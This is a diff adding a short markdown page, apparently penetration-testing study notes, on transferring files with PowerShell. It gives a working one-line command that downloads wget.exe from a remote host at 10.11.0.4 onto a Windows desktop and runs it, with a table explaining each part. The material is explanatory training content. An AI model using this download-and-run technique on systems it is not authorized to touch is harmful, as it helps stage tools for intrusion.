@@ -1,0 +1,27 @@
+---
+description: Notes on moving files using PowerShell
+---
+
+# File Transfers
+
+Because of the versatility (i.e. complexity) of PowerShell the file transfer mechanisms are more complex than they would be with netcat or socat for example.
+
+#### Example
+
+In this example a copy of `wget.exe` will be downloaded from the machine at `10.11.0.4` via HTTP. This command is executed from the standard Windows Command prompt (`cmd.exe`).
+
+{% code overflow="wrap" lineNumbers="true" %}
+```shell
+C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+
+C:\Users\offsec\Desktop> wget.exe -V
+GNU Wget 1.9.1
+```
+{% endcode %}
+
+| Component                    | Description                                                                                           |
+| ---------------------------- | ----------------------------------------------------------------------------------------------------- |
+| `-c`                         | Execute the supplied command (wrapped in double-quotes) as if it were typed at the PowerShell prompt. |
+| `New-Object`                 | Cmdlet to instantiate either a .Net Framework or a COM object.                                        |
+| `System.Net.WebClient`       | Object class used to access web resources via URI                                                     |
+| `DownloadFile({URL}, {LOC})` | Download file from `{URL}` and store it on the local machine at `{LOC}`                               |
